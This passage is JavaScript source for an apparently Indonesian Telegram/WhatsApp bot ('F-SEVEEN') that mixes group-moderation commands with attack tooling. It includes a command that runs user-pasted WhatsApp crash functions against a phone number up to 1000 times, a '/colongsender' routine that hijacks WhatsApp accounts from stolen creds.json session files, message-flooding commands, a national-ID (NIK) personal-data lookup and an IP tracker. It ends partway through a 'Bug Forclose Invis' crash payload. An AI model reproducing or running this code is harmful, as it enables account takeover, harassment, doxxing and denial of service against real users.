async function sendLokasiInfo(chatId, lat, lon, name) {
  await bot.sendLocation(chatId, lat, lon);
  await bot.sendMessage(chatId,
    `📌 *Lokasi Ditemukan:*\n` +
    `🗺️ ${name || 'Koordinat'}\n` +
    `📍 Latitude: ${lat}\n` +
    `📍 Longitude: ${lon}`,
    { parse_mode: 'Markdown' }
  );
}

bot.onText(/^\/tes (.+)/, async (msg, match) => {
  try {
    const chatId = msg.chat.id;
    const args = msg.text.split(" ");
    if (args.length < 3)
      return bot.sendMessage(chatId, "🪧 ☇ Format: /tes 62××× 10 (reply function)");

    const q = args[1];
    const jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 1000));
    if (isNaN(jumlah) || jumlah <= 0)
      return bot.sendMessage(chatId, "❌ ☇ Jumlah harus angka");

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    if (!msg.reply_to_message || !msg.reply_to_message.text)
      return bot.sendMessage(chatId, "❌ ☇ Reply dengan function");

    const processMsg = await bot.sendPhoto(chatId, thumbnailUrl, {
      caption: `<blockquote><pre>『 F-SEVEEN 』</pre></blockquote>
⌑ Target: ${q}
⌑ Type: Unknown Function
⌑ Status: Process`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }]
        ]
      }
    });

    const processMessageId = processMsg.message_id;

    const safeSock = createSafeSock(sock);
    const funcCode = msg.reply_to_message.text;
    const matchFunc = funcCode.match(/async function\s+(\w+)/);
    if (!matchFunc)
      return bot.sendMessage(chatId, "❌ ☇ Function tidak valid");

    const funcName = matchFunc[1];

    const sandbox = {
      console,
      Buffer,
      sock: safeSock,
      target,
      sleep,
      generateWAMessageFromContent,
      generateForwardMessageContent,
      generateWAMessage,
      prepareWAMessageMedia,
      proto,
      jidDecode,
      areJidsSameUser,
    };

    const context = vm.createContext(sandbox);
    const wrapper = `${funcCode}\n${funcName}`;
    const fn = vm.runInContext(wrapper, context);

    for (let i = 0; i < jumlah; i++) {
      try {
        const arity = fn.length;
        if (arity === 1) {
          await fn(target);
        } else if (arity === 2) {
          await fn(safeSock, target);
        } else {
          await fn(safeSock, target, true);
        }
      } catch (err) {}
      await sleep(200);
    }

    const finalText = `<blockquote><pre>『 F-SEVEEN 』</pre></blockquote>
⌑ Target: ${q}
⌑ Type: Unknown Function
⌑ Status: Success`;

    try {
      await bot.editMessageCaption(finalText, {
        chat_id: chatId,
        message_id: processMessageId,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }]
          ]
        }
      });
    } catch (e) {
      await bot.sendPhoto(chatId, thumbnailUrl, {
        caption: finalText,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }]
          ]
        }
      });
    }
  } catch (err) {
    console.error(err);
    bot.sendMessage(msg.chat.id, "❌ ☇ Terjadi kesalahan internal.");
  }
});

bot.onText(/^\/unmute$/, async (msg) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;

    // Harus membalas pesan
    if (!msg.reply_to_message) {
        return bot.sendMessage(chatId, '❌ balas pesan pengguna yang ingin di-unmute.');
    }

    const targetUser = msg.reply_to_message.from;

    try {
        // Cek apakah pengirim adalah admin
        const admins = await bot.getChatAdministrators(chatId);
        const isAdmin = admins.some(admin => admin.user.id === fromId);
        if (!isAdmin) {
            return bot.sendMessage(chatId, '❌ hanya admin yang bisa menggunakan perintah ini.');
        }

        // Unmute pengguna
        await bot.restrictChatMember(chatId, targetUser.id, {
            permissions: {
                can_send_messages: true,
                can_send_media_messages: true,
                can_send_polls: true,
                can_send_other_messages: true,
                can_add_web_page_previews: true,
                can_invite_users: true,
                can_pin_messages: false,  // Bisa disesuaikan
                can_change_info: false    // Bisa disesuaikan
            }
        });

        // Notifikasi ke grup
        await bot.sendMessage(chatId,
            `✅ si baby [${targetUser.first_name}](tg://user?id=${targetUser.id}) telah di unmute🤓.`,
            { parse_mode: 'Markdown' });

        // Balas ke pesan pengguna
        await bot.sendMessage(chatId,
            '🔊 *pengguna telah di-unmute di grup ini, silakan mengobrol kembali.*',
            {
                parse_mode: 'Markdown',
                reply_to_message_id: msg.reply_to_message.message_id
            });

    } catch (err) {
        console.error('❌ Error saat unmute:', err);
        bot.sendMessage(chatId, '❌ Gagal melakukan unmute.');
    }
});
bot.onText(/^\/spam(?: (\d+))?$/, async (msg, match) => {
    const chatId = msg.chat.id;
    const reply = msg.reply_to_message;
    const jumlah = parseInt(match[1]);

    if (!reply) {
        return bot.sendMessage(chatId, "❌ Harap reply pesan yang ingin di-spam.");
    }

    if (!jumlah || isNaN(jumlah) || jumlah <= 0 || jumlah > 100) {
        return bot.sendMessage(chatId, "❌ Masukkan jumlah antara 1 - 100.\nContoh: /spam 20");
    }

    const content = reply.text || reply.caption || '[Media tanpa teks]';

    for (let i = 0; i < jumlah; i++) {
        await bot.sendMessage(chatId, content, {
            reply_to_message_id: reply.message_id
        }).catch(e => console.log("Gagal kirim:", e.message));

        await new Promise(resolve => setTimeout(resolve, 300)); // Delay biar gak ke flood
    }
});

bot.onText(/^\/allmember$/, async (msg) => {
    const chatId = msg.chat.id;
    const isGroup = msg.chat.type.includes('group');
    const reply = msg.reply_to_message;

    if (!isGroup) return bot.sendMessage(chatId, "❌ Perintah ini hanya untuk grup.");

    try {
        const admins = await bot.getChatAdministrators(chatId);
        const memberNames = admins.map((admin, i) => {
            const user = admin.user;
            const name = user.first_name + (user.last_name ? " " + user.last_name : "");
            return `${i + 1}. ${name} (${user.username ? "@" + user.username : "tidak ada username"})`;
        });

        const hasil = `👥 Daftar Member Aktif (Admin):\n\n${memberNames.join("\n")}`;

        bot.sendMessage(chatId, hasil, {
            reply_to_message_id: reply?.message_id
        });
    } catch (e) {
        console.error(e);
        bot.sendMessage(chatId, "❌ Gagal mengambil daftar member.");
    }
});
bot.onText(/^\/ban$/, async (msg) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;

    // Harus membalas pesan
    if (!msg.reply_to_message) {
        return bot.sendMessage(chatId, '❌ Balas pesan pengguna yang ingin di-ban.');
    }

    const targetUser = msg.reply_to_message.from;

    try {
        // Cek apakah pengirim adalah admin
        const admins = await bot.getChatAdministrators(chatId);
        const isAdmin = admins.some(admin => admin.user.id === fromId);
        if (!isAdmin) {
            return bot.sendMessage(chatId, '❌ Hanya admin yang bisa menggunakan perintah ini.');
        }

        // Ban pengguna
        await bot.banChatMember(chatId, targetUser.id);

        // Notifikasi ke grup
        await bot.sendMessage(chatId,
            `✅ Pengguna [${targetUser.first_name}](tg://user?id=${targetUser.id}) telah di-ban.`,
            { parse_mode: 'Markdown' });

        // Pesan follow-up di bawah reply
        await bot.sendMessage(chatId,
            '🚫 *Pengguna telah di-ban dari grup ini oleh admin.*',
            {
                parse_mode: 'Markdown',
                reply_to_message_id: msg.reply_to_message.message_id
            });

    } catch (err) {
        console.error('❌ Error saat ban:', err);
        bot.sendMessage(chatId, '❌ Gagal melakukan ban.');
    }
});

bot.onText(/^\/unban$/, async (msg) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;

    // Harus membalas pesan
    if (!msg.reply_to_message) {
        return bot.sendMessage(chatId, '❌ Balas pesan pengguna yang ingin di-unban.');
    }

    const targetUser = msg.reply_to_message.from;

    try {
        // Cek apakah pengirim adalah admin
        const admins = await bot.getChatAdministrators(chatId);
        const isAdmin = admins.some(admin => admin.user.id === fromId);
        if (!isAdmin) {
            return bot.sendMessage(chatId, '❌ Hanya admin yang bisa menggunakan perintah ini.');
        }

        // Unban pengguna
        await bot.unbanChatMember(chatId, targetUser.id, {
            only_if_banned: true
        });

        // Notifikasi ke grup
        await bot.sendMessage(chatId,
            `✅ Pengguna [${targetUser.first_name}](tg://user?id=${targetUser.id}) telah di-unban.`,
            { parse_mode: 'Markdown' });

        // Pesan tambahan
        await bot.sendMessage(chatId,
            '🔓 *Pengguna telah di-unban dari grup ini, silakan bergabung kembali.*',
            {
                parse_mode: 'Markdown',
                reply_to_message_id: msg.reply_to_message.message_id
            });

    } catch (err) {
        console.error('❌ Error saat unban:', err);
        bot.sendMessage(chatId, '❌ Gagal melakukan unban.');
    }
});

bot.onText(/^\/kick$/, async (msg) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;

    // Harus membalas pesan
    if (!msg.reply_to_message) {
        return bot.sendMessage(chatId, '❌ Balas pesan pengguna yang ingin di-kick.');
    }

    const targetUser = msg.reply_to_message.from;

    try {
        // Cek apakah pengirim adalah admin
        const admins = await bot.getChatAdministrators(chatId);
        const isAdmin = admins.some(admin => admin.user.id === fromId);
        if (!isAdmin) {
            return bot.sendMessage(chatId, '❌ Hanya admin yang bisa menggunakan perintah ini.');
        }

        // Kick: ban lalu unban agar bisa join lagi
        await bot.banChatMember(chatId, targetUser.id);
        await bot.unbanChatMember(chatId, targetUser.id);

        // Notifikasi ke grup
        await bot.sendMessage(chatId,
            `✅ Pengguna [${targetUser.first_name}](tg://user?id=${targetUser.id}) telah di-kick.`,
            { parse_mode: 'Markdown' });

        // Pesan tambahan sebagai reply
        await bot.sendMessage(chatId,
            '👢 *Pengguna telah di-kick dari grup ini oleh admin. Pengguna dapat bergabung kembali jika diperbolehkan.*',
            {
                parse_mode: 'Markdown',
                reply_to_message_id: msg.reply_to_message.message_id
            });

    } catch (err) {
        console.error('❌ Error saat kick:', err);
        bot.sendMessage(chatId, '❌ Gagal melakukan kick.');
    }
});
bot.onText(/^\/fileinfo$/, (msg) => {
  bot.sendMessage(msg.chat.id, "📂 Kirim file yang mau kamu cek infonya!");
});

// Saat user kirim file, foto, audio, atau dokumen
bot.on("document", async (msg) => handleFile(msg, "document"));
bot.on("photo", async (msg) => handleFile(msg, "photo"));
bot.on("video", async (msg) => handleFile(msg, "video"));
bot.on("audio", async (msg) => handleFile(msg, "audio"));

async function handleFile(msg, type) {
  const chatId = msg.chat.id;
  let fileId, fileName;

  if (type === "document") {
    fileId = msg.document.file_id;
    fileName = msg.document.file_name;
  } else if (type === "photo") {
    const photo = msg.photo.pop();
    fileId = photo.file_id;
    fileName = `photo_${chatId}.jpg`;
  } else if (type === "video") {
    fileId = msg.video.file_id;
    fileName = msg.video.file_name || `video_${chatId}.mp4`;
  } else if (type === "audio") {
    fileId = msg.audio.file_id;
    fileName = msg.audio.file_name || `audio_${chatId}.mp3`;
  }

  try {
    const file = await bot.getFile(fileId);
    const fileUrl = `https://api.telegram.org/file/bot${bot.token}/${file.file_path}`;
    const fileExt = path.extname(file.file_path);
    const fileSize = formatBytes(file.file_size);

    const info = `
📁 *Informasi File*
━━━━━━━━━━━━━━━━
📄 Nama: ${fileName}
📏 Ukuran: ${fileSize}
🧩 Ekstensi: ${fileExt || "-"}
🔗 URL: [Klik di sini](${fileUrl})
`;

    bot.sendMessage(chatId, info, { parse_mode: "Markdown", disable_web_page_preview: false });
  } catch (err) {
    console.error("❌ Gagal ambil info file:", err);
    bot.sendMessage(chatId, "⚠️ Gagal mendapatkan info file. Coba kirim ulang filenya.");
  }
}

// Fungsi bantu untuk format ukuran file
function formatBytes(bytes, decimals = 2) {
  if (!+bytes) return "0 B";
  const k = 1024;
  const dm = decimals < 0 ? 0 : decimals;
  const sizes = ["B", "KB", "MB", "GB", "TB"];
  const i = Math.floor(Math.log(bytes) / Math.log(k));
  return `${parseFloat((bytes / Math.pow(k, i)).toFixed(dm))} ${sizes[i]}`;
}

bot.onText(/\/nfsw/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const name = msg.from.first_name;

  try {
    const res = await fetch("https://api.waifu.pics/nsfw/waifu");
    const json = await res.json();
    const imageUrl = json.url;

    await bot.sendPhoto(chatId, imageUrl, {
      caption: `🔞 *NSFW Waifu Request*\n\n• Permintaan oleh: [${name}](tg://user?id=${userId})\n• Source: waifu.pics\n\n_Awas panas! Ini waifu versi dewasa 😈_`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "NEXT", callback_data: "waifu18_next" },
            { text: "CHANNEL", url: "https://t.me/deathflowersnew" }
          ],
          [
            { text: "TUTUP", callback_data: "close" }
          ]
        ]
      }
    });
  } catch (err) {
    await bot.sendMessage(chatId, "❌ Gagal memuat waifu. Coba lagi nanti.");
  }
});

bot.on("callback_query", async (callbackQuery) => {
  const data = callbackQuery.data;
  const msg = callbackQuery.message;

  if (data === "waifu18_next") {
    try {
      const res = await fetch("https://api.waifu.pics/nsfw/waifu");
      const json = await res.json();
      const imageUrl = json.url;

      await bot.editMessageMedia(
        {
          type: "photo",
          media: imageUrl,
          caption: `🔞 *NSFW NIH LU SANGE?*\n\n_PASTI NGOCOK_ 😈`,
          parse_mode: "Markdown"
        },
        {
          chat_id: msg.chat.id,
          message_id: msg.message_id,
          reply_markup: {
            inline_keyboard: [
              [
                { text: "NEXT", callback_data: "waifu18_next" },
                { text: "CHANNEL", url: "https://t.me/deathflowersnew" }
              ],
              [
                { text: "TUTUP", callback_data: "close" }
              ]
            ]
          }
        }
      );
    } catch (err) {
      await bot.answerCallbackQuery(callbackQuery.id, {
        text: "⚠️ Gagal ambil waifu baru!",
        show_alert: true
      });
    }
  }

  if (data === "close") {
    bot.deleteMessage(msg.chat.id, msg.message_id);
  }
});

bot.onText(/^\/beritaindo$/, async (msg) => {
  const chatId = msg.chat.id;
  await bot.sendMessage(chatId, "📰 Sedang mengambil berita terbaru Indonesia...");

  try {
    // RSS Google News Indonesia
    const url = "https://news.google.com/rss?hl=id&gl=ID&ceid=ID:id";
    const res = await fetch(url);
    const xml = await res.text();

    // Ambil judul dan link berita (pakai regex biar ringan)
    const titles = [...xml.matchAll(/<title>(?:<!\[CDATA\[)?(.*?)(?:\]\]>)?<\/title>/g)].map((m) => m[1]);
    const links = [...xml.matchAll(/<link>(.*?)<\/link>/g)].map((m) => m[1]);

    // Lewati item pertama (judul feed)
    const items = titles.slice(1, 6).map((t, i) => ({
      title: t,
      link: links[i + 1] || "",
    }));

    // Format teks berita
    const beritaText = items
      .map((item, i) => `${i + 1}. [${item.title}](${item.link})`)
      .join("\n\n");

    await bot.sendMessage(
      chatId,
      `🇮🇩 *Berita Indonesia Terbaru*\n\n${beritaText}\n\nSumber: ©nanzlyora`,
      { parse_mode: "Markdown", disable_web_page_preview: true }
    );
  } catch (error) {
    console.error("❌ Error beritaindo:", error);
    bot.sendMessage(chatId, "⚠️ Gagal mengambil berita. Coba lagi nanti.");
  }
});
// -- ( case nik perse )
bot.onText(/\/nikparse(.*)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const nik = match[1].trim();

  // Validasi input
  if (!nik) {
    return bot.sendMessage(chatId, "🪧 Format: /nikparse 1234567890283625");
  }

  if (!/^\d{16}$/.test(nik)) {
    return bot.sendMessage(chatId, "❌ ☇ NIK harus 16 digit angka");
  }

  // Kirim pesan menunggu
  const waitMsg = await bot.sendMessage(chatId, "⏳ ☇ Sedang memproses pengecekan NIK...");

  // Fungsi buat format hasil
  const replyHTML = async (d) => {
    const get = (x) => x ?? "-";
    const caption = `
<blockquote>『 F-SEVEEN 』</blockquote>
⌑ NIK: ${get(d.nik) || nik}
⌑ Nama: ${get(d.nama)}
⌑ Jenis Kelamin: ${get(d.jenis_kelamin || d.gender)}
⌑ Tempat Lahir: ${get(d.tempat_lahir || d.tempat)}
⌑ Tanggal Lahir: ${get(d.tanggal_lahir || d.tgl_lahir)}
⌑ Umur: ${get(d.umur)}
⌑ Provinsi: ${get(d.provinsi || d.province)}
⌑ Kabupaten/Kota: ${get(d.kabupaten || d.kota || d.regency)}
⌑ Kecamatan: ${get(d.kecamatan || d.district)}
⌑ Kelurahan/Desa: ${get(d.kelurahan || d.village)}
    `;

    await bot.sendMessage(chatId, caption, { parse_mode: "HTML", disable_web_page_preview: true });
  };

  // === Mulai proses cek NIK ===
  try {
    const a1 = await axios.get(`https://api.akuari.my.id/national/nik?nik=${nik}`, {
      headers: { "user-agent": "Mozilla/5.0" },
      timeout: 15000,
    });

    if (a1?.data?.status && a1?.data?.result) {
      await replyHTML(a1.data.result);
    } else {
      const a2 = await axios.get(`https://api.nikparser.com/nik/${nik}`, {
        headers: { "user-agent": "Mozilla/5.0" },
        timeout: 15000,
      });
      if (a2?.data) {
        await replyHTML(a2.data);
      } else {
        await bot.sendMessage(chatId, "❌ ☇ NIK tidak ditemukan");
      }
    }
  } catch (err) {
    try {
      const a2 = await axios.get(`https://api.nikparser.com/nik/${nik}`, {
        headers: { "user-agent": "Mozilla/5.0" },
        timeout: 15000,
      });
      if (a2?.data) {
        await replyHTML(a2.data);
      } else {
        await bot.sendMessage(chatId, "❌ ☇ Gagal menghubungi API, coba lagi nanti");
      }
    } catch {
      await bot.sendMessage(chatId, "❌ ☇ Gagal menghubungi API, coba lagi nanti");
    }
  } finally {
    // Hapus pesan "menunggu"
    try {
      await bot.deleteMessage(chatId, waitMsg.message_id);
    } catch (e) {}
  }
});

bot.onText(/^\/colongsender$/i, async (msg) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah user adalah owner
    if (!isOwner(senderId)) {
        return bot.sendMessage(chatId, '❌ Khusus owner we.');
    }

    // Cek apakah membalas document
    const doc = msg.reply_to_message?.document;
    if (!doc) {
        return bot.sendMessage(chatId, '❌ Balas file session atau creds.json dengan /colongsender');
    }

    const name = doc.file_name.toLowerCase();

    // Validasi ekstensi file
    const allowedExts = ['.json', '.zip', '.tar', '.tar.gz', '.tgz'];
    if (!allowedExts.some(ext => name.endsWith(ext))) {
        return bot.sendMessage(chatId, '❌ File bukan session tolol.');
    }

    const processingMsg = await bot.sendMessage(chatId, '🔄 Proses colong sender in you session…');

    try {
        // Download file
        const url = await bot.getFileLink(doc.file_id);
        const { data } = await axios.get(url, { responseType: 'arraybuffer' });

        // Buat temporary directory
        const tmp = await fs.mkdtemp(path.join(os.tmpdir(), 'sess-'));

        // Extract file berdasarkan tipe
        if (name.endsWith('.json')) {
            await fs.writeFile(path.join(tmp, 'creds.json'), data);
        } else if (name.endsWith('.zip')) {
            const AdmZip = require('adm-zip');
            new AdmZip(Buffer.from(data)).extractAllTo(tmp, true);
        } else {
            const tmpTar = path.join(tmp, name);
            await fs.writeFile(tmpTar, data);
            await tar.x({ file: tmpTar, cwd: tmp });
            await fs.rm(tmpTar, { recursive: true, force: true });
        }

        // Cari file creds.json
        const credsPath = await findCredsFile(tmp);
        if (!credsPath) {
            await fs.rm(tmp, { recursive: true, force: true });
            return bot.editMessageText('❌ creds.json tidak ditemukan bego', {
                chat_id: chatId,
                message_id: processingMsg.message_id
            });
        }

        // Baca creds.json untuk mendapatkan nomor bot
        const creds = JSON.parse(await fs.readFile(credsPath, 'utf8'));
        const botNumber = creds.me?.id?.split(':')[0];

        if (!botNumber) {
            await fs.rm(tmp, { recursive: true, force: true });
            return bot.editMessageText('❌ Format creds.json tidak valid', {
                chat_id: chatId,
                message_id: processingMsg.message_id
            });
        }

        // Siapkan directory tujuan
        const destDir = createSessionDir(botNumber);

        // Hapus session lama jika ada, lalu copy yang baru
        await fs.rm(destDir, { recursive: true, force: true });
        await fs.copy(tmp, destDir);

        // Simpan ke active sessions
        saveActiveSessions(botNumber);

        // Connect ke WhatsApp
        const { state, saveCreds } = await useMultiFileAuthState(destDir);

        sock = makeWASocket({
            auth: state,
            printQRInTerminal: false,
            logger: P({ level: "silent" }),
            defaultQueryTimeoutMs: undefined,
        });

        // Setup event handlers
        sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;

            if (connection === "open") {
                sessions.set(botNumber, sock);
                await bot.editMessageText(`✅ Session ${botNumber} done maling sendernya bre 😈🤭.`, {
                    chat_id: chatId,
                    message_id: processingMsg.message_id
                });
            } else if (connection === "close") {
                const statusCode = lastDisconnect?.error?.output?.statusCode;
                if (statusCode && statusCode >= 500 && statusCode < 600) {
                    await bot.editMessageText(`❌ Gagal connect ${botNumber}, coba lagi nanti.`, {
                        chat_id: chatId,
                        message_id: processingMsg.message_id
                    });
                } else {
                    await bot.editMessageText(`❌ Session ${botNumber} invalid atau sudah logout.`, {
                        chat_id: chatId,
                        message_id: processingMsg.message_id
                    });
                    try {
                        await fs.rm(destDir, { recursive: true, force: true });
                    } catch (error) {
                        console.error("Error deleting session:", error);
                    }
                }
            }
        });

        sock.ev.on("creds.update", saveCreds);

        // Bersihkan temporary files
        await fs.rm(tmp, { recursive: true, force: true });

    } catch (error) {
        console.error('Error in colongsender:', error);
        await bot.editMessageText(`❌ Error: ${error.message}`, {
            chat_id: chatId,
            message_id: processingMsg.message_id
        });
    }
});


bot.onText(/^\/trackip(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  if (!isOwner(msg.from.id)) return bot.sendMessage(chatId, '❌ Hanya owner.')
  try {
    if (!match[1]) {
      return bot.sendMessage(chatId, "ip nya mana dongo", {
        reply_to_message_id: msg.message_id,
      });
    }
    const res = await axios.get(`https://ipwhois.app/json/${match[1]}`);
    const d = res.data;
    await bot.sendMessage(chatId, "```json\n" + JSON.stringify(d, null, 2) + "```", {
        parse_mode: "Markdown",
        reply_to_message_id: msg.message_id,
      });
  } catch (err) {
    bot.sendMessage(chatId, err.message, {
      reply_to_message_id: msg.message_id,
    });
  }
});


bot.onText(/\/gethtml (.+)?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const url = match[1];
    
    if (!/^https?:\/\//.test(url)) 
        return bot.sendMessage(chatId, `Example: /gethtml https://Majestys.tzy.id`, {
        parse_mode: "HTML"
        });

    bot.sendMessage(chatId, `⚡ Proses mengambil file.`, {
    parse_mode: "HTML"
    });

    try {
        const res = await fetch(url);
        const contentLength = parseInt(res.headers.get("content-length") || "0");
        if (contentLength > 100 * 1024 * 1024)
            throw `File terlalu besar: ${contentLength} bytes`;

        const contentType = res.headers.get("content-type") || "";

        if (contentType.startsWith("image/")) {
            return bot.sendPhoto(chatId, url);
        }

        if (contentType.startsWith("video/")) {
            return bot.sendVideo(chatId, url);
        }

        if (contentType.startsWith("audio/")) {
            return bot.sendAudio(chatId, url, { caption: "Audio dari URL" });
        }

        const arrayBuffer = await res.arrayBuffer();
        const buffer = Buffer.from(arrayBuffer);

        if (contentType.includes("text") || contentType.includes("json")) {
            let text = buffer.toString();

            if (text.length > 4096) {
    const htmlContent = text;

    return bot.sendDocument(
        chatId,
        Buffer.from(htmlContent, "utf-8"),
        { caption: "Hasil HTML dari URL" },
        { filename: "Rizkyy.html", contentType: "text/html" }
    );
} else {
                return bot.sendMessage(chatId, text);
            }
        } else {
            return bot.sendDocument(
                chatId,
                buffer,
                { caption: "File dari URL" },
                { filename: "file.bin", contentType: contentType || "application/octet-stream" }
            );
        }

    } catch (err) {
        return bot.sendMessage(chatId, `❌ Gagal mengambil file: ` + err);
    }
});


bot.onText(/\/ig(?:\s(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide an Instagram post/reel URL.\n\nExample:\n/ig https://www.instagram.com/reel/xxxxxx/");
    }

    const url = match[1].trim();

    try {
        const apiUrl = `https://api.nvidiabotz.xyz/download/instagram?url=${encodeURIComponent(url)}`;

        const res = await fetch(apiUrl);
        const data = await res.json();

        if (!data || !data.result) {
            return bot.sendMessage(chatId, "❌ Failed to fetch Instagram media. Please check the URL.");
        }

        // Jika ada video
        if (data.result.video) {
            await bot.sendVideo(chatId, data.result.video, {
                caption: `📸 Instagram Media\n\n👤 Author: ${data.result.username || "-"}`
            });
        } 
        // Jika hanya gambar
        else if (data.result.image) {
            await bot.sendPhoto(chatId, data.result.image, {
                caption: `📸 Instagram Media\n\n👤 Author: ${data.result.username || "-"}`
            });
        } 
        else {
            bot.sendMessage(chatId, "❌ UnSupported media type from Instagram.");
        }
    } catch (err) {
        console.error("Instagram API Error:", err);
        bot.sendMessage(chatId, "❌ Error fetching Instagram media. Please try again later.");
    }
});


bot.onText(/\/brat(?:\s(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a text.\n\nExample:\n/brat Rizky Ganteng");
    }

    const text = match[1].trim();

    try {
        const apiUrl = `https://api.nvidiabotz.xyz/imagecreator/bratv?text=${encodeURIComponent(text)}`;

        // langsung kirim gambar dari API
        await bot.sendPhoto(chatId, apiUrl, {
            caption: `🖼️ Brat Image Generated\n\n✏️ Text: *${text}*`,
            parse_mode: "Markdown"
        });
    } catch (err) {
        console.error("Brat API Error:", err);
        bot.sendMessage(chatId, "❌ Error generating Brat image. Please try again later.");
    }
});
bot.onText(/^\/tourl$/, async (msg) => {
    const chatId = msg.chat.id;      
    if (!msg.reply_to_message || (!msg.reply_to_message.document && !msg.reply_to_message.photo && !msg.reply_to_message.video)) {
        return bot.sendMessage(chatId, "```❌\n❌ Silakan reply sebuah file/foto/video dengan command /tourl```", { reply_to_message_id: msg.message_id, parse_mode: "Markdown" });
    }
    const repliedMsg = msg.reply_to_message;
    let fileId, fileName;    
    if (repliedMsg.document) {
        fileId = repliedMsg.document.file_id;
        fileName = repliedMsg.document.file_name || `file_${Date.now()}`;
    } else if (repliedMsg.photo) {
        fileId = repliedMsg.photo[repliedMsg.photo.length - 1].file_id;
        fileName = `photo_${Date.now()}.jpg`;
    } else if (repliedMsg.video) {
        fileId = repliedMsg.video.file_id;
        fileName = `video_${Date.now()}.mp4`;
    }
    try {        
        const processingMsg = await bot.sendMessage(chatId, "```⌛\n⏳ Mengupload ke Catbox...```", { reply_to_message_id: msg.message_id, parse_mode: "Markdown" });        
        const fileLink = await bot.getFileLink(fileId);
        const response = await axios.get(fileLink, { responseType: 'stream' });
        const FormData = require ("form-data");
        const form = new FormData();
        form.append('reqtype', 'fileupload');
        form.append('fileToUpload', response.data, {
            filename: fileName,
            contentType: response.headers['content-type']
        });
        const { data: catboxUrl } = await axios.post('https://catbox.moe/user/api.php', form, {
            headers: form.getHeaders()
        });

        
        await bot.editMessageText(`*✅ Upload berhasil! 📎URL:* \`\`\`🖼️📎\n${catboxUrl}\`\`\``, {
            chat_id: chatId,
            message_id: processingMsg.message_id,
            parse_mode: "Markdown"
        });

    } catch (error) {
        console.error(error);
        bot.sendMessage(chatId, "❌ Gagal mengupload file ke Catbox");
    }
});
bot.onText(/^\/rasukbot(?: (.+))?/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const input = (match[1] || "").trim();
  const reply = msg.reply_to_message;

  // Jika user hanya mengetik /rasukbot tanpa apapun
  if (!input) {
    return bot.sendMessage(chatId,
      "📘 <b>Cara penggunaan /rasukbot</b>\n\n" +
      "🟢 <b>1. Kirim langsung (tanpa reply)</b>\n" +
      "Gunakan format:\n<code>/rasukbot token|id|pesan|jumlah</code>\n\n" +
      "Contoh:\n<code>/rasukbot 123456:ABCDEF|987654321|Halo bro|5</code>\n\n" +
      "🔵 <b>2. Balas pesan target</b>\n" +
      "Balas pesan orangnya, lalu ketik:\n<code>/rasukbot token|pesan|jumlah</code>\n\n" +
      "Contoh:\n<code>/rasukbot 123456:ABCDEF|Halo|3</code>",
      { parse_mode: "HTML" }
    );
  }

  try {
    let token, targetId, pesan, jumlah;

    // Jika user membalas pesan seseorang
    if (reply) {
      const parts = input.split("|").map(x => x.trim());
      if (parts.length < 3) {
        return bot.sendMessage(chatId,
          "❌ Format salah!\nGunakan: <code>/rasukbot token|pesan|jumlah</code> (balas pesan target)",
          { parse_mode: "HTML" }
        );
      }

      [token, pesan, jumlah] = parts;
      targetId = reply.from.id;
      jumlah = parseInt(jumlah);

    } else {
      // Format manual tanpa reply
      if (!input.includes("|")) {
        return bot.sendMessage(chatId,
          "📩 Format salah!\n\nGunakan format:\n" +
          "<code>/rasukbot token|id|pesan|jumlah</code>\n\n" +
          "Contoh:\n<code>/rasukbot 123456:ABCDEF|987654321|Halo bro|5</code>",
          { parse_mode: "HTML" }
        );
      }

      const parts = input.split("|").map(x => x.trim());
      [token, targetId, pesan, jumlah] = parts;
      jumlah = parseInt(jumlah);
    }

    if (!token || !targetId || !pesan || isNaN(jumlah)) {
      return bot.sendMessage(chatId,
        "❌ Format salah!\nGunakan: <code>/rasukbot token|id|pesan|jumlah</code>",
        { parse_mode: "HTML" }
      );
    }

    await bot.sendMessage(chatId, "🚀 Mengirim pesan...");

    for (let i = 1; i <= jumlah; i++) {
      await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
        chat_id: targetId,
        text: pesan
      });
    }

    bot.sendMessage(chatId, `✅ Berhasil mengirim ${jumlah} pesan ke ID <code>${targetId}</code>`, {
      parse_mode: "HTML"
    });

  } catch (err) {
    bot.sendMessage(chatId, `❌ Gagal mengirim pesan:\n<code>${err.message}</code>`, {
      parse_mode: "HTML"
    });
  }
});
// ------------------ ( Function Disini ) ------------------------ \\
async function FcInvis(jid){
  console.log(chalk.red(`Sending Bug Forclose Invis To ${jid}`))

  const {
    encodeSignedDeviceIdentity,
    jidEncode,
    jidDecode,
    encodeWAMessage,
    patchMessageBeforeSending,
    encodeNewsletterMessage
  } = require("@whiskeysockets/baileys")

  let devices = (
    await sock.getUSyncDevices([jid], false, false)
  ).map(({ user, device }) => `${user}:${device || ""}@s.whatsapp.net`)

  await sock.assertSessions(devices)

  let xnxx = () => {
    let map = {}
    return {
      mutex(key, fn){
        map[key] ??= { task: Promise.resolve() }
        map[key].task = (async p => {
          try { await p } catch {}
          return fn()
        })(map[key].task)
        return map[key].task
      }
    }
  }

  let memek = xnxx()
